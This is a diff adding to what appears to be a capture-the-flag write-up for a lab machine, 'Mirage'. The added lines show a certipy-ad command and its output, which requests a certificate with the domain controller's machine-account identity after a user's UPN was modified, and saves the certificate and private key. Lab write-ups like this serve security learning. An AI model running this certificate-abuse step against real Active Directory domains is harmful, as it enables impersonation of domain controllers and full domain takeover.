@@ -883,6 +883,22 @@ SMB         dc01.mirage.htb 445    dc01             [+] Run the following comman
 
 I then need to request a TGT, its important this takes place after the UPN is mofified
 
+```python
+❯❯❯ faketime -f +7h certipy-ad req -k -no-pass -dc-ip '10.129.232.163' -target 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 10
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'dc$@mirage.htb'
+[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Saving certificate and private key to 'dc.pfx'
+[*] Wrote certificate and private key to 'dc.pfx'
+```
+
+Ill then use a TGT of `mark.bbond` to request a certificate for the DC$ machine account
+
 
 
 
